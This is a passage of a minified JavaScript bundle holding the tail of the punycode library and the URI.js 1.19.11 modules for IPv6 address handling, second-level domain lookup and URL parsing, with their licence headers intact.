            var b, X = 2147483647, Y = 36, F = 1, V = 26, K = 38, Q = 700, ee = 72, ae = 128, ne = "-", oe = /^xn--/, ue = /[^\x20-\x7E]/, fe = /[\x2E\u3002\uFF0E\uFF61]/g, he = {
                overflow: "Overflow: input needs wider integers to process",
                "not-basic": "Illegal input >= 0x80 (not a basic code point)",
                "invalid-input": "Invalid input"
            }, pe = Y - F, ye = Math.floor, be = String.fromCharCode, xe;
            function Ae($) {
                throw new RangeError(he[$])
            }
            function Ee($, ie) {
                for (var ve = $.length, ge = []; ve--; )
                    ge[ve] = ie($[ve]);
                return ge
            }
            function Be($, ie) {
                var ve = $.split("@")
                  , ge = "";
                ve.length > 1 && (ge = ve[0] + "@",
                $ = ve[1]),
                $ = $.replace(fe, ".");
                var Re = $.split(".")
                  , Pe = Ee(Re, ie).join(".");
                return ge + Pe
            }
            function ce($) {
                for (var ie = [], ve = 0, ge = $.length, Re, Pe; ve < ge; )
                    Re = $.charCodeAt(ve++),
                    Re >= 55296 && Re <= 56319 && ve < ge ? (Pe = $.charCodeAt(ve++),
                    (Pe & 64512) == 56320 ? ie.push(((Re & 1023) << 10) + (Pe & 1023) + 65536) : (ie.push(Re),
                    ve--)) : ie.push(Re);
                return ie
            }
            function q($) {
                return Ee($, function(ie) {
                    var ve = "";
                    return ie > 65535 && (ie -= 65536,
                    ve += be(ie >>> 10 & 1023 | 55296),
                    ie = 56320 | ie & 1023),
                    ve += be(ie),
                    ve
                }).join("")
            }
            function L($) {
                return $ - 48 < 10 ? $ - 22 : $ - 65 < 26 ? $ - 65 : $ - 97 < 26 ? $ - 97 : Y
            }
            function U($, ie) {
                return $ + 22 + 75 * ($ < 26) - ((ie != 0) << 5)
            }
            function Z($, ie, ve) {
                var ge = 0;
                for ($ = ve ? ye($ / Q) : $ >> 1,
                $ += ye($ / ie); $ > pe * V >> 1; ge += Y)
                    $ = ye($ / pe);
                return ye(ge + (pe + 1) * $ / ($ + K))
            }
            function te($) {
                var ie = [], ve = $.length, ge, Re = 0, Pe = ae, Ie = ee, Te, Le, Ze, $e, Ne, qe, Ve, lt, nt;
                for (Te = $.lastIndexOf(ne),
                Te < 0 && (Te = 0),
                Le = 0; Le < Te; ++Le)
                    $.charCodeAt(Le) >= 128 && Ae("not-basic"),
                    ie.push($.charCodeAt(Le));
                for (Ze = Te > 0 ? Te + 1 : 0; Ze < ve; ) {
                    for ($e = Re,
                    Ne = 1,
                    qe = Y; Ze >= ve && Ae("invalid-input"),
                    Ve = L($.charCodeAt(Ze++)),
                    (Ve >= Y || Ve > ye((X - Re) / Ne)) && Ae("overflow"),
                    Re += Ve * Ne,
                    lt = qe <= Ie ? F : qe >= Ie + V ? V : qe - Ie,
                    !(Ve < lt); qe += Y)
                        nt = Y - lt,
                        Ne > ye(X / nt) && Ae("overflow"),
                        Ne *= nt;
                    ge = ie.length + 1,
                    Ie = Z(Re - $e, ge, $e == 0),
                    ye(Re / ge) > X - Pe && Ae("overflow"),
                    Pe += ye(Re / ge),
                    Re %= ge,
                    ie.splice(Re++, 0, Pe)
                }
                return q(ie)
            }
            function se($) {
                var ie, ve, ge, Re, Pe, Ie, Te, Le, Ze, $e, Ne, qe = [], Ve, lt, nt, je;
                for ($ = ce($),
                Ve = $.length,
                ie = ae,
                ve = 0,
                Pe = ee,
                Ie = 0; Ie < Ve; ++Ie)
                    Ne = $[Ie],
                    Ne < 128 && qe.push(be(Ne));
                for (ge = Re = qe.length,
                Re && qe.push(ne); ge < Ve; ) {
                    for (Te = X,
                    Ie = 0; Ie < Ve; ++Ie)
                        Ne = $[Ie],
                        Ne >= ie && Ne < Te && (Te = Ne);
                    for (lt = ge + 1,
                    Te - ie > ye((X - ve) / lt) && Ae("overflow"),
                    ve += (Te - ie) * lt,
                    ie = Te,
                    Ie = 0; Ie < Ve; ++Ie)
                        if (Ne = $[Ie],
                        Ne < ie && ++ve > X && Ae("overflow"),
                        Ne == ie) {
                            for (Le = ve,
                            Ze = Y; $e = Ze <= Pe ? F : Ze >= Pe + V ? V : Ze - Pe,
                            !(Le < $e); Ze += Y)
                                je = Le - $e,
                                nt = Y - $e,
                                qe.push(be(U($e + je % nt, 0))),
                                Le = ye(je / nt);
                            qe.push(be(U(Le, 0))),
                            Pe = Z(ve, lt, ge == Re),
                            ve = 0,
                            ++ge
                        }
                    ++ve,
                    ++ie
                }
                return qe.join("")
            }
            function de($) {
                return Be($, function(ie) {
                    return oe.test(ie) ? te(ie.slice(4).toLowerCase()) : ie
                })
            }
            function re($) {
                return Be($, function(ie) {
                    return ue.test(ie) ? "xn--" + se(ie) : ie
                })
            }
            if (b = {
                version: "1.3.2",
                ucs2: {
                    decode: ce,
                    encode: q
                },
                decode: te,
                encode: se,
                toASCII: re,
                toUnicode: de
            },
            O && x)
                if (_.exports == O)
                    x.exports = b;
                else
                    for (xe in b)
                        b.hasOwnProperty(xe) && (O[xe] = b[xe]);
            else
                j.punycode = b
        }
        )(punycode$3)
    }(punycode$4, punycode$4.exports)),
    punycode$4.exports
}
var IPv6$1 = {
    exports: {}
};
/*!
 * URI.js - Mutating URLs
 * IPv6 Support
 *
 * Version: 1.19.11
 *
 * Author: Rodney Rehm
 * Web: http://medialize.github.io/URI.js/
 *
 * Licensed under
 *   MIT License http://www.opensource.org/licenses/mit-license
 *
 */
var IPv6 = IPv6$1.exports, hasRequiredIPv6;
function requireIPv6() {
    return hasRequiredIPv6 || (hasRequiredIPv6 = 1,
    function(_) {
        (function(M, j) {
            _.exports ? _.exports = j() : M.IPv6 = j(M)
        }
        )(IPv6, function(M) {
            var j = M && M.IPv6;
            function O(w) {
                var b = w.toLowerCase()
                  , X = b.split(":")
                  , Y = X.length
                  , F = 8;
                X[0] === "" && X[1] === "" && X[2] === "" ? (X.shift(),
                X.shift()) : X[0] === "" && X[1] === "" ? X.shift() : X[Y - 1] === "" && X[Y - 2] === "" && X.pop(),
                Y = X.length,
                X[Y - 1].indexOf(".") !== -1 && (F = 7);
                var V;
                for (V = 0; V < Y && X[V] !== ""; V++)
                    ;
                if (V < F)
                    for (X.splice(V, 1, "0000"); X.length < F; )
                        X.splice(V, 0, "0000");
                for (var K, Q = 0; Q < F; Q++) {
                    K = X[Q].split("");
                    for (var ee = 0; ee < 3 && (K[0] === "0" && K.length > 1); ee++)
                        K.splice(0, 1);
                    X[Q] = K.join("")
                }
                var ae = -1
                  , ne = 0
                  , oe = 0
                  , ue = -1
                  , fe = !1;
                for (Q = 0; Q < F; Q++)
                    fe ? X[Q] === "0" ? oe += 1 : (fe = !1,
                    oe > ne && (ae = ue,
                    ne = oe)) : X[Q] === "0" && (fe = !0,
                    ue = Q,
                    oe = 1);
                oe > ne && (ae = ue,
                ne = oe),
                ne > 1 && X.splice(ae, ne, ""),
                Y = X.length;
                var he = "";
                for (X[0] === "" && (he = ":"),
                Q = 0; Q < Y && (he += X[Q],
                Q !== Y - 1); Q++)
                    he += ":";
                return X[Y - 1] === "" && (he += ":"),
                he
            }
            function x() {
                return M.IPv6 === this && (M.IPv6 = j),
                this
            }
            return {
                best: O,
                noConflict: x
            }
        })
    }(IPv6$1)),
    IPv6$1.exports
}
var SecondLevelDomains$1 = {
    exports: {}
};
/*!
 * URI.js - Mutating URLs
 * Second Level Domain (SLD) Support
 *
 * Version: 1.19.11
 *
 * Author: Rodney Rehm
 * Web: http://medialize.github.io/URI.js/
 *
 * Licensed under
 *   MIT License http://www.opensource.org/licenses/mit-license
 *
 */
var SecondLevelDomains = SecondLevelDomains$1.exports, hasRequiredSecondLevelDomains;
function requireSecondLevelDomains() {
    return hasRequiredSecondLevelDomains || (hasRequiredSecondLevelDomains = 1,
    function(_) {
        (function(M, j) {
            _.exports ? _.exports = j() : M.SecondLevelDomains = j(M)
        }
        )(SecondLevelDomains, function(M) {
            var j = M && M.SecondLevelDomains
              , O = {
                list: {
                    ac: " com gov mil net org ",
                    ae: " ac co gov mil name net org pro sch ",
                    af: " com edu gov net org ",
                    al: " com edu gov mil net org ",
                    ao: " co ed gv it og pb ",
                    ar: " com edu gob gov int mil net org tur ",
                    at: " ac co gv or ",
                    au: " asn com csiro edu gov id net org ",
                    ba: " co com edu gov mil net org rs unbi unmo unsa untz unze ",
                    bb: " biz co com edu gov info net org store tv ",
                    bh: " biz cc com edu gov info net org ",
                    bn: " com edu gov net org ",
                    bo: " com edu gob gov int mil net org tv ",
                    br: " adm adv agr am arq art ato b bio blog bmd cim cng cnt com coop ecn edu eng esp etc eti far flog fm fnd fot fst g12 ggf gov imb ind inf jor jus lel mat med mil mus net nom not ntr odo org ppg pro psc psi qsl rec slg srv tmp trd tur tv vet vlog wiki zlg ",
                    bs: " com edu gov net org ",
                    bz: " du et om ov rg ",
                    ca: " ab bc mb nb nf nl ns nt nu on pe qc sk yk ",
                    ck: " biz co edu gen gov info net org ",
                    cn: " ac ah bj com cq edu fj gd gov gs gx gz ha hb he hi hl hn jl js jx ln mil net nm nx org qh sc sd sh sn sx tj tw xj xz yn zj ",
                    co: " com edu gov mil net nom org ",
                    cr: " ac c co ed fi go or sa ",
                    cy: " ac biz com ekloges gov ltd name net org parliament press pro tm ",
                    do: " art com edu gob gov mil net org sld web ",
                    dz: " art asso com edu gov net org pol ",
                    ec: " com edu fin gov info med mil net org pro ",
                    eg: " com edu eun gov mil name net org sci ",
                    er: " com edu gov ind mil net org rochest w ",
                    es: " com edu gob nom org ",
                    et: " biz com edu gov info name net org ",
                    fj: " ac biz com info mil name net org pro ",
                    fk: " ac co gov net nom org ",
                    fr: " asso com f gouv nom prd presse tm ",
                    gg: " co net org ",
                    gh: " com edu gov mil org ",
                    gn: " ac com gov net org ",
                    gr: " com edu gov mil net org ",
                    gt: " com edu gob ind mil net org ",
                    gu: " com edu gov net org ",
                    hk: " com edu gov idv net org ",
                    hu: " 2000 agrar bolt casino city co erotica erotika film forum games hotel info ingatlan jogasz konyvelo lakas media news org priv reklam sex shop sport suli szex tm tozsde utazas video ",
                    id: " ac co go mil net or sch web ",
                    il: " ac co gov idf k12 muni net org ",
                    in: " ac co edu ernet firm gen gov i ind mil net nic org res ",
                    iq: " com edu gov i mil net org ",
                    ir: " ac co dnssec gov i id net org sch ",
                    it: " edu gov ",
                    je: " co net org ",
                    jo: " com edu gov mil name net org sch ",
                    jp: " ac ad co ed go gr lg ne or ",
                    ke: " ac co go info me mobi ne or sc ",
                    kh: " com edu gov mil net org per ",
                    ki: " biz com de edu gov info mob net org tel ",
                    km: " asso com coop edu gouv k medecin mil nom notaires pharmaciens presse tm veterinaire ",
                    kn: " edu gov net org ",
                    kr: " ac busan chungbuk chungnam co daegu daejeon es gangwon go gwangju gyeongbuk gyeonggi gyeongnam hs incheon jeju jeonbuk jeonnam k kg mil ms ne or pe re sc seoul ulsan ",
                    kw: " com edu gov net org ",
                    ky: " com edu gov net org ",
                    kz: " com edu gov mil net org ",
                    lb: " com edu gov net org ",
                    lk: " assn com edu gov grp hotel int ltd net ngo org sch soc web ",
                    lr: " com edu gov net org ",
                    lv: " asn com conf edu gov id mil net org ",
                    ly: " com edu gov id med net org plc sch ",
                    ma: " ac co gov m net org press ",
                    mc: " asso tm ",
                    me: " ac co edu gov its net org priv ",
                    mg: " com edu gov mil nom org prd tm ",
                    mk: " com edu gov inf name net org pro ",
                    ml: " com edu gov net org presse ",
                    mn: " edu gov org ",
                    mo: " com edu gov net org ",
                    mt: " com edu gov net org ",
                    mv: " aero biz com coop edu gov info int mil museum name net org pro ",
                    mw: " ac co com coop edu gov int museum net org ",
                    mx: " com edu gob net org ",
                    my: " com edu gov mil name net org sch ",
                    nf: " arts com firm info net other per rec store web ",
                    ng: " biz com edu gov mil mobi name net org sch ",
                    ni: " ac co com edu gob mil net nom org ",
                    np: " com edu gov mil net org ",
                    nr: " biz com edu gov info net org ",
                    om: " ac biz co com edu gov med mil museum net org pro sch ",
                    pe: " com edu gob mil net nom org sld ",
                    ph: " com edu gov i mil net ngo org ",
                    pk: " biz com edu fam gob gok gon gop gos gov net org web ",
                    pl: " art bialystok biz com edu gda gdansk gorzow gov info katowice krakow lodz lublin mil net ngo olsztyn org poznan pwr radom slupsk szczecin torun warszawa waw wroc wroclaw zgora ",
                    pr: " ac biz com edu est gov info isla name net org pro prof ",
                    ps: " com edu gov net org plo sec ",
                    pw: " belau co ed go ne or ",
                    ro: " arts com firm info nom nt org rec store tm www ",
                    rs: " ac co edu gov in org ",
                    sb: " com edu gov net org ",
                    sc: " com edu gov net org ",
                    sh: " co com edu gov net nom org ",
                    sl: " com edu gov net org ",
                    st: " co com consulado edu embaixada gov mil net org principe saotome store ",
                    sv: " com edu gob org red ",
                    sz: " ac co org ",
                    tr: " av bbs bel biz com dr edu gen gov info k12 name net org pol tel tsk tv web ",
                    tt: " aero biz cat co com coop edu gov info int jobs mil mobi museum name net org pro tel travel ",
                    tw: " club com ebiz edu game gov idv mil net org ",
                    mu: " ac co com gov net or org ",
                    mz: " ac co edu gov org ",
                    na: " co com ",
                    nz: " ac co cri geek gen govt health iwi maori mil net org parliament school ",
                    pa: " abo ac com edu gob ing med net nom org sld ",
                    pt: " com edu gov int net nome org publ ",
                    py: " com edu gov mil net org ",
                    qa: " com edu gov mil net org ",
                    re: " asso com nom ",
                    ru: " ac adygeya altai amur arkhangelsk astrakhan bashkiria belgorod bir bryansk buryatia cbg chel chelyabinsk chita chukotka chuvashia com dagestan e-burg edu gov grozny int irkutsk ivanovo izhevsk jar joshkar-ola kalmykia kaluga kamchatka karelia kazan kchr kemerovo khabarovsk khakassia khv kirov koenig komi kostroma kranoyarsk kuban kurgan kursk lipetsk magadan mari mari-el marine mil mordovia mosreg msk murmansk nalchik net nnov nov novosibirsk nsk omsk orenburg org oryol penza perm pp pskov ptz rnd ryazan sakhalin samara saratov simbirsk smolensk spb stavropol stv surgut tambov tatarstan tom tomsk tsaritsyn tsk tula tuva tver tyumen udm udmurtia ulan-ude vladikavkaz vladimir vladivostok volgograd vologda voronezh vrn vyatka yakutia yamal yekaterinburg yuzhno-sakhalinsk ",
                    rw: " ac co com edu gouv gov int mil net ",
                    sa: " com edu gov med net org pub sch ",
                    sd: " com edu gov info med net org tv ",
                    se: " a ac b bd c d e f g h i k l m n o org p parti pp press r s t tm u w x y z ",
                    sg: " com edu gov idn net org per ",
                    sn: " art com edu gouv org perso univ ",
                    sy: " com edu gov mil net news org ",
                    th: " ac co go in mi net or ",
                    tj: " ac biz co com edu go gov info int mil name net nic org test web ",
                    tn: " agrinet com defense edunet ens fin gov ind info intl mincom nat net org perso rnrt rns rnu tourism ",
                    tz: " ac co go ne or ",
                    ua: " biz cherkassy chernigov chernovtsy ck cn co com crimea cv dn dnepropetrovsk donetsk dp edu gov if in ivano-frankivsk kh kharkov kherson khmelnitskiy kiev kirovograd km kr ks kv lg lugansk lutsk lviv me mk net nikolaev od odessa org pl poltava pp rovno rv sebastopol sumy te ternopil uzhgorod vinnica vn zaporizhzhe zhitomir zp zt ",
                    ug: " ac co go ne or org sc ",
                    uk: " ac bl british-library co cym gov govt icnet jet lea ltd me mil mod national-library-scotland nel net nhs nic nls org orgn parliament plc police sch scot soc ",
                    us: " dni fed isa kids nsn ",
                    uy: " com edu gub mil net org ",
                    ve: " co com edu gob info mil net org web ",
                    vi: " co com k12 net org ",
                    vn: " ac biz com edu gov health info int name net org pro ",
                    ye: " co com gov ltd me net org plc ",
                    yu: " ac co edu gov org ",
                    za: " ac agric alt bourse city co cybernet db edu gov grondar iaccess imt inca landesign law mil net ngo nis nom olivetti org pix school tm web ",
                    zm: " ac co com edu gov net org sch ",
                    com: "ar br cn de eu gb gr hu jpn kr no qc ru sa se uk us uy za ",
                    net: "gb jp se uk ",
                    org: "ae",
                    de: "com "
                },
                has: function(x) {
                    var w = x.lastIndexOf(".");
                    if (w <= 0 || w >= x.length - 1)
                        return !1;
                    var b = x.lastIndexOf(".", w - 1);
                    if (b <= 0 || b >= w - 1)
                        return !1;
                    var X = O.list[x.slice(w + 1)];
                    return X ? X.indexOf(" " + x.slice(b + 1, w) + " ") >= 0 : !1
                },
                is: function(x) {
                    var w = x.lastIndexOf(".");
                    if (w <= 0 || w >= x.length - 1)
                        return !1;
                    var b = x.lastIndexOf(".", w - 1);
                    if (b >= 0)
                        return !1;
                    var X = O.list[x.slice(w + 1)];
                    return X ? X.indexOf(" " + x.slice(0, w) + " ") >= 0 : !1
                },
                get: function(x) {
                    var w = x.lastIndexOf(".");
                    if (w <= 0 || w >= x.length - 1)
                        return null;
                    var b = x.lastIndexOf(".", w - 1);
                    if (b <= 0 || b >= w - 1)
                        return null;
                    var X = O.list[x.slice(w + 1)];
                    return !X || X.indexOf(" " + x.slice(b + 1, w) + " ") < 0 ? null : x.slice(b + 1)
                },
                noConflict: function() {
                    return M.SecondLevelDomains === this && (M.SecondLevelDomains = j),
                    this
                }
            };
            return O
        })
    }(SecondLevelDomains$1)),
    SecondLevelDomains$1.exports
}
/*!
 * URI.js - Mutating URLs
 *
 * Version: 1.19.11
 *
 * Author: Rodney Rehm
 * Web: http://medialize.github.io/URI.js/
 *
 * Licensed under
 *   MIT License http://www.opensource.org/licenses/mit-license
 *
 */
var URI = URI$1.exports, hasRequiredURI;
function requireURI() {
    return hasRequiredURI || (hasRequiredURI = 1,
    function(_) {
        (function(M, j) {
            _.exports ? _.exports = j(requirePunycode$1(), requireIPv6(), requireSecondLevelDomains()) : M.URI = j(M.punycode, M.IPv6, M.SecondLevelDomains, M)
        }
        )(URI, function(M, j, O, x) {
            var w = x && x.URI;
            function b(L, U) {
                var Z = arguments.length >= 1
                  , te = arguments.length >= 2;
                if (!(this instanceof b))
                    return Z ? te ? new b(L,U) : new b(L) : new b;
                if (L === void 0) {
                    if (Z)
                        throw new TypeError("undefined is not a valid argument for URI");
                    typeof location < "u" ? L = location.href + "" : L = ""
                }
                if (L === null && Z)
                    throw new TypeError("null is not a valid argument for URI");
                return this.href(L),
                U !== void 0 ? this.absoluteTo(U) : this
            }
            function X(L) {
                return /^[0-9]+$/.test(L)
            }
            b.version = "1.19.11";
            var Y = b.prototype
              , F = Object.prototype.hasOwnProperty;
            function V(L) {
                return L.replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1")
            }
            function K(L) {
                return L === void 0 ? "Undefined" : String(Object.prototype.toString.call(L)).slice(8, -1)
            }
            function Q(L) {
                return K(L) === "Array"
            }
            function ee(L, U) {
                var Z = {}, te, se;
                if (K(U) === "RegExp")
                    Z = null;
                else if (Q(U))
                    for (te = 0,
                    se = U.length; te < se; te++)
                        Z[U[te]] = !0;
                else
                    Z[U] = !0;
                for (te = 0,
                se = L.length; te < se; te++) {
                    var de = Z && Z[L[te]] !== void 0 || !Z && U.test(L[te]);
                    de && (L.splice(te, 1),
                    se--,
                    te--)
                }
                return L
            }
            function ae(L, U) {
                var Z, te;
                if (Q(U)) {
                    for (Z = 0,
                    te = U.length; Z < te; Z++)
                        if (!ae(L, U[Z]))
                            return !1;
                    return !0
                }
                var se = K(U);
                for (Z = 0,
                te = L.length; Z < te; Z++)
                    if (se === "RegExp") {
                        if (typeof L[Z] == "string" && L[Z].match(U))
                            return !0
                    } else if (L[Z] === U)
                        return !0;
                return !1
            }
            function ne(L, U) {
                if (!Q(L) || !Q(U) || L.length !== U.length)
                    return !1;
                L.sort(),
                U.sort();
                for (var Z = 0, te = L.length; Z < te; Z++)
                    if (L[Z] !== U[Z])
                        return !1;
                return !0
            }
            function oe(L) {
                var U = /^\/+|\/+$/g;
                return L.replace(U, "")
            }
            b._parts = function() {
                return {
                    protocol: null,
                    username: null,
                    password: null,
                    hostname: null,
                    urn: null,
                    port: null,
                    path: null,
                    query: null,
                    fragment: null,
                    preventInvalidHostname: b.preventInvalidHostname,
                    duplicateQueryParameters: b.duplicateQueryParameters,
                    escapeQuerySpace: b.escapeQuerySpace
                }
            }
            ,
            b.preventInvalidHostname = !1,
            b.duplicateQueryParameters = !1,
            b.escapeQuerySpace = !0,
            b.protocol_expression = /^[a-z][a-z0-9.+-]*$/i,
            b.idn_expression = /[^a-z0-9\._-]/i,
            b.punycode_expression = /(xn--)/i,
            b.ip4_expression = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,
            b.ip6_expression = /^\s*((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))(%.+)?\s*$/,
            b.find_uri_expression = /\b((?:[a-z][\w-]+:(?:\/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?]))/ig,
            b.findUri = {
                start: /\b(?:([a-z][a-z0-9.+-]*:\/\/)|www\.)/gi,
                end: /[\s\r\n]|$/,
                trim: /[`!()\[\]{};:'".,<>?]+$/,
                parens: /(\([^\)]*\)|\[[^\]]*\]|\{[^}]*\}|<[^>]*>)/g
            },
            b.leading_whitespace_expression = /^[\x00-\x20\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]+/,
            b.ascii_tab_whitespace = /[\u0009\u000A\u000D]+/g,
            b.defaultPorts = {
                http: "80",
                https: "443",
                ftp: "21",
                gopher: "70",
                ws: "80",
                wss: "443"
            },
            b.hostProtocols = ["http", "https"],
            b.invalid_hostname_characters = /[^a-zA-Z0-9\.\-:_]/,
            b.domAttributes = {
                a: "href",
                blockquote: "cite",
                link: "href",
                base: "href",
                script: "src",
                form: "action",
                img: "src",
                area: "href",
                iframe: "src",
                embed: "src",
                source: "src",
                track: "src",
                input: "src",
                audio: "src",
                video: "src"
            },
            b.getDomAttribute = function(L) {
                if (!(!L || !L.nodeName)) {
                    var U = L.nodeName.toLowerCase();
                    if (!(U === "input" && L.type !== "image"))
                        return b.domAttributes[U]
                }
            }
            ;
            function ue(L) {
                return escape(L)
            }
            function fe(L) {
                return encodeURIComponent(L).replace(/[!'()*]/g, ue).replace(/\*/g, "%2A")
            }
            b.encode = fe,
            b.decode = decodeURIComponent,
            b.iso8859 = function() {
                b.encode = escape,
                b.decode = unescape
            }
            ,
            b.unicode = function() {
                b.encode = fe,
                b.decode = decodeURIComponent
            }
            ,
            b.characters = {
                pathname: {
                    encode: {
                        expression: /%(24|26|2B|2C|3B|3D|3A|40)/ig,
                        map: {
                            "%24": "$",
                            "%26": "&",
                            "%2B": "+",
                            "%2C": ",",
                            "%3B": ";",
                            "%3D": "=",
                            "%3A": ":",
                            "%40": "@"
                        }
                    },
                    decode: {
                        expression: /[\/\?#]/g,
                        map: {
                            "/": "%2F",
                            "?": "%3F",
                            "#": "%23"
                        }
                    }
                },
                reserved: {
                    encode: {
                        expression: /%(21|23|24|26|27|28|29|2A|2B|2C|2F|3A|3B|3D|3F|40|5B|5D)/ig,
                        map: {
                            "%3A": ":",
                            "%2F": "/",
                            "%3F": "?",
                            "%23": "#",
                            "%5B": "[",
                            "%5D": "]",
                            "%40": "@",
                            "%21": "!",
                            "%24": "$",
                            "%26": "&",
                            "%27": "'",
                            "%28": "(",
                            "%29": ")",
                            "%2A": "*",
                            "%2B": "+",
                            "%2C": ",",
                            "%3B": ";",
                            "%3D": "="
                        }
                    }
                },
                urnpath: {
                    encode: {
                        expression: /%(21|24|27|28|29|2A|2B|2C|3B|3D|40)/ig,
                        map: {
                            "%21": "!",
                            "%24": "$",
                            "%27": "'",
                            "%28": "(",
                            "%29": ")",
                            "%2A": "*",
                            "%2B": "+",
                            "%2C": ",",
                            "%3B": ";",
                            "%3D": "=",
                            "%40": "@"
                        }
                    },
                    decode: {
                        expression: /[\/\?#:]/g,
                        map: {
                            "/": "%2F",
                            "?": "%3F",
                            "#": "%23",
                            ":": "%3A"
                        }
                    }
                }
            },
            b.encodeQuery = function(L, U) {
                var Z = b.encode(L + "");
                return U === void 0 && (U = b.escapeQuerySpace),
                U ? Z.replace(/%20/g, "+") : Z
            }
            ,
            b.decodeQuery = function(L, U) {
                L += "",
                U === void 0 && (U = b.escapeQuerySpace);
                try {
                    return b.decode(U ? L.replace(/\+/g, "%20") : L)
                } catch {
                    return L
                }
            }
            ;
            var he = {
                encode: "encode",
                decode: "decode"
            }, pe, ye = function(L, U) {
                return function(Z) {
                    try {
                        return b[U](Z + "").replace(b.characters[L][U].expression, function(te) {
                            return b.characters[L][U].map[te]
                        })
                    } catch {
                        return Z
                    }
                }
            };
            for (pe in he)
                b[pe + "PathSegment"] = ye("pathname", he[pe]),
                b[pe + "UrnPathSegment"] = ye("urnpath", he[pe]);
            var be = function(L, U, Z) {
                return function(te) {
                    var se;
                    Z ? se = function(ie) {
                        return b[U](b[Z](ie))
                    }
                    : se = b[U];
                    for (var de = (te + "").split(L), re = 0, $ = de.length; re < $; re++)
                        de[re] = se(de[re]);
                    return de.join(L)
                }
            };
            b.decodePath = be("/", "decodePathSegment"),
            b.decodeUrnPath = be(":", "decodeUrnPathSegment"),
            b.recodePath = be("/", "encodePathSegment", "decode"),
            b.recodeUrnPath = be(":", "encodeUrnPathSegment", "decode"),
            b.encodeReserved = ye("reserved", "encode"),
            b.parse = function(L, U) {
                var Z;
                return U || (U = {
                    preventInvalidHostname: b.preventInvalidHostname
                }),
                L = L.replace(b.leading_whitespace_expression, ""),
                L = L.replace(b.ascii_tab_whitespace, ""),
                Z = L.indexOf("#"),
                Z > -1 && (U.fragment = L.substring(Z + 1) || null,
                L = L.substring(0, Z)),
                Z = L.indexOf("?"),
                Z > -1 && (U.query = L.substring(Z + 1) || null,
                L = L.substring(0, Z)),
                L = L.replace(/^(https?|ftp|wss?)?:+[/\\]*/i, "$1://"),
                L = L.replace(/^[/\\]{2,}/i, "//"),
                L.substring(0, 2) === "//" ? (U.protocol = null,
                L = L.substring(2),
                L = b.parseAuthority(L, U)) : (Z = L.indexOf(":"),
                Z > -1 && (U.protocol = L.substring(0, Z) || null,
                U.protocol && !U.protocol.match(b.protocol_expression) ? U.protocol = void 0 : L.substring(Z + 1, Z + 3).replace(/\\/g, "/") === "//" ? (L = L.substring(Z + 3),
                L = b.parseAuthority(L, U)) : (L = L.substring(Z + 1),
                U.urn = !0))),
                U.path = L,
                U
            }
            ,
            b.parseHost = function(L, U) {
                L || (L = ""),
                L = L.replace(/\\/g, "/");
                var Z = L.indexOf("/"), te, se;
                if (Z === -1 && (Z = L.length),
                L.charAt(0) === "[")
                    te = L.indexOf("]"),
                    U.hostname = L.substring(1, te) || null,
                    U.port = L.substring(te + 2, Z) || null,
                    U.port === "/" && (U.port = null);
                else {
                    var de = L.indexOf(":")
                      , re = L.indexOf("/")
                      , $ = L.indexOf(":", de + 1);
                    $ !== -1 && (re === -1 || $ < re) ? (U.hostname = L.substring(0, Z) || null,
                    U.port = null) : (se = L.substring(0, Z).split(":"),
                    U.hostname = se[0] || null,
                    U.port = se[1] || null)
                }
                return U.hostname && L.substring(Z).charAt(0) !== "/" && (Z++,
                L = "/" + L),
                U.preventInvalidHostname && b.ensureValidHostname(U.hostname, U.protocol),
                U.port && b.ensureValidPort(U.port),
                L.substring(Z) || "/"
            }
            ,
            b.parseAuthority = function(L, U) {
                return L = b.parseUserinfo(L, U),
                b.parseHost(L, U)
            }
            ,
            b.parseUserinfo = function(L, U) {
                var Z = L
                  , te = L.indexOf("\\");
                te !== -1 && (L = L.replace(/\\/g, "/"));
                var se = L.indexOf("/"), de = L.lastIndexOf("@", se > -1 ? se : L.length - 1), re;
                return de > -1 && (se === -1 || de < se) ? (re = L.substring(0, de).split(":"),
                U.username = re[0] ? b.decode(re[0]) : null,
                re.shift(),
                U.password = re[0] ? b.decode(re.join(":")) : null,
                L = Z.substring(de + 1)) : (U.username = null,
                U.password = null),
                L
            }
            ,
            b.parseQuery = function(L, U) {
                if (!L)
                    return {};
